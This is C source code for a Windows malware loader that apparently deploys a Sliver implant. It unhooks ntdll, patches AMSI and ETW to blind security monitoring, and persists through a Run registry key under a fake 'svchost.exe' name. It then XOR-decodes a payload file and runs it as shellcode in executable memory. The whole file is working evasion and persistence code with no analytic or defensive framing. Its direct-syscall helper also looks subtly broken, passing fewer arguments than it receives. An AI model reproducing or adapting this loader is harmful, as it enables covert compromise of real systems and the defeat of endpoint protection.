#include <windows.h>
#include <stdio.h>
#include <stdarg.h>

#define XOR_KEY 0xAA

// DJB2 hash
DWORD HashString(const char* str) {
    DWORD h = 5381;
    while (*str) h = ((h << 5) + h) + *str++;
    return h;
}

// Resolve syscall SSN from ntdll exports (works Win10/11)
DWORD ResolveSSN(LPCSTR name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY x = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll +
        n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)ntdll + x->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)ntdll + x->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)ntdll + x->AddressOfFunctions);
    DWORD target = HashString(name);
    for (DWORD i = 0; i < x->NumberOfNames; i++) {
        const char* fn = (const char*)((BYTE*)ntdll + names[i]);
        if (fn[0] == 'Z' && fn[1] == 'w' && HashString(fn + 2) == target)
            return ords[i];
    }
    return 0;
}

// Direct syscall function (GCC inline asm)
// Args: ssn, rcx, rdx, r8, r9, [stack...]
LONG DoSyscall(DWORD ssn, int argc, ...) {
    va_list va;
    va_start(va, argc);
    ULONG_PTR args[10] = {0};
    for (int i = 0; i < argc && i < 10; i++) args[i] = va_arg(va, ULONG_PTR);
    va_end(va);
    
    LONG result;
    // Direct syscall using GCC extended asm
    __asm__ volatile(
        "mov %[ssn], %%eax\n\t"
        "mov %[a0], %%r10\n\t"
        "mov %[a1], %%rdx\n\t"
        "mov %[a2], %%r8\n\t"
        "mov %[a3], %%r9\n\t"
        "mov %[a0], %%rcx\n\t"
        "syscall\n\t"
        "mov %%eax, %[res]\n\t"
        : [res] "=m"(result)
        : [ssn] "m"(ssn),
          [a0] "m"(args[0]),
          [a1] "m"(args[1]),
          [a2] "m"(args[2]),
          [a3] "m"(args[3])
        : "eax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    return result;
}

// NtAllocateVirtualMemory via direct syscall
PVOID SysAlloc(SIZE_T size) {
    PVOID addr = NULL;
    SIZE_T s = size;
    DoSyscall(ResolveSSN("NtAllocateVirtualMemory"), 6,
        (ULONG_PTR)GetCurrentProcess(),
        (ULONG_PTR)&addr,
        (ULONG_PTR)0,
        (ULONG_PTR)&s,
        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
        (ULONG_PTR)PAGE_EXECUTE_READWRITE);
    return addr;
}

// Unhook NTDLL - remap fresh .text from disk
void UnhookNTDLL() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + d->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(n);
    PVOID text = NULL; SIZE_T tsz = 0;
    for (int i = 0; i < n->FileHeader.NumberOfSections; i++, s++) {
        if (*(DWORD*)s->Name == 0x74786574) { // "text"
            text = (BYTE*)ntdll + s->VirtualAddress;
            tsz = s->Misc.VirtualSize; break;
        }
    }
    if (!text) return;
    char p[MAX_PATH];
    GetSystemDirectoryA(p, MAX_PATH);
    strcat(p, "\\ntdll.dll");
    HANDLE f = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD fs = GetFileSize(f, NULL);
    BYTE* fb = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fs);
    DWORD br; ReadFile(f, fb, fs, &br, NULL); CloseHandle(f);
    PIMAGE_DOS_HEADER fd = (PIMAGE_DOS_HEADER)fb;
    PIMAGE_NT_HEADERS fn = (PIMAGE_NT_HEADERS)(fb + fd->e_lfanew);
    PIMAGE_SECTION_HEADER fsx = IMAGE_FIRST_SECTION(fn);
    for (int i = 0; i < fn->FileHeader.NumberOfSections; i++, fsx++) {
        if (*(DWORD*)fsx->Name == 0x74786574) {
            DWORD o; VirtualProtect(text, fsx->SizeOfRawData, PAGE_EXECUTE_READWRITE, &o);
            memcpy(text, fb + fsx->PointerToRawData, fsx->SizeOfRawData);
            VirtualProtect(text, fsx->SizeOfRawData, o, &o); break;
        }
    }
    HeapFree(GetProcessHeap(), 0, fb);
}

// Patch AmsiScanBuffer
void PatchAMSI() {
    HMODULE a = LoadLibraryA("amsi.dll");
    if (!a) return;
    BYTE* p = (BYTE*)GetProcAddress(a, "AmsiScanBuffer");
    if (!p) return;
    DWORD o;
    VirtualProtect(p, 8, PAGE_EXECUTE_READWRITE, &o);
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax,E_INVALIDARG; ret
    memcpy(p, patch, sizeof(patch));
    VirtualProtect(p, 8, o, &o);
}

// Patch EtwEventWrite
void PatchETW() {
    HMODULE n = GetModuleHandleA("ntdll.dll");
    if (!n) return;
    BYTE* p = (BYTE*)GetProcAddress(n, "EtwEventWrite");
    if (!p) return;
    DWORD o;
    VirtualProtect(p, 4, PAGE_EXECUTE_READWRITE, &o);
    p[0] = 0xC3; // ret → immediately return
    VirtualProtect(p, 4, o, &o);
}

int main() {
    UnhookNTDLL();
    PatchETW();
    PatchAMSI();
    
    // Persist: copy self to AppData, add registry Run key
    char dest[MAX_PATH], src[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\svchost.exe", dest, MAX_PATH);
    CopyFileA(src, dest, FALSE);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == 0) {
        RegSetValueExA(hKey, "WindowsHost", 0, REG_SZ, (BYTE*)dest, strlen(dest) + 1);
        RegCloseKey(hKey);
    }
    
    // Also persist sliver.bin to same location
    char binSrc[MAX_PATH], binDst[MAX_PATH];
    char* bs = strrchr(src, '\\');
    if (bs) *(bs + 1) = 0;
    sprintf(binSrc, "%ssliver.bin", src);
    ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\sliver.bin", binDst, MAX_PATH);
    CopyFileA(binSrc, binDst, FALSE);

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* last = strrchr(path, '\\');
    if (last) *(last + 1) = 0;
    strcat(path, "sliver.bin");

    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 1;

    DWORD sz = GetFileSize(hf, NULL);
    BYTE* enc = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD br; ReadFile(hf, enc, sz, &br, NULL); CloseHandle(hf);

    BYTE* sc = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz);
    for (DWORD i = 0; i < sz; i++) sc[i] = enc[i] ^ XOR_KEY;
    HeapFree(GetProcessHeap(), 0, enc);

    // Allocate via direct syscall
    PVOID mem = SysAlloc(sz);
    if (!mem) mem = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, sc, sz);
    HeapFree(GetProcessHeap(), 0, sc);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    Sleep(INFINITE);
    return 0;
}
